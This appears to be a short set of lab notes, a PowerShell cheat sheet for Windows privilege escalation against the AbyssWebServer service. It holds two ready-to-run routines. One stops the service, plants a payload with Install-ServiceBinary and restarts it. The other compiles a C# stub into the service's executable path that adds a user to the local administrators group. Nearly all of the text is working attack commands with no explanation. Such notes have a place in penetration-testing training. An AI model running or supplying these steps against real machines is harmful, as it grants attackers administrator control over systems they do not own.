**Unquoted Service Path:**
```powershell
# 1. Stop service
Stop-Service AbyssWebServer

# 2. Add curent user in local admins
Install-ServiceBinary -Name 'AbyssWebServer' -UserName 'student1'
# или:
Install-ServiceBinary -Name 'AbyssWebServer' -Command 'net localgroup administrators student1 /add'

# 3. Start service
Start-Service AbyssWebServer

# 4. Check
net localgroup administrators
```

```powershell
# 1. Stop Service
Stop-Service AbyssWebServer

# 2. Change Path and Username !!!
Add-Type -TypeDefinition @"
using System;
using System.Diagnostics;
class P {
    static void Main() {
        Process.Start("cmd.exe", "/c net localgroup administrators studentX /add");
    }
}
"@ -OutputAssembly C:\WebServer\Abyss.exe -OutputType ConsoleApplication

# 3. Start service
Start-Service AbyssWebServer
```
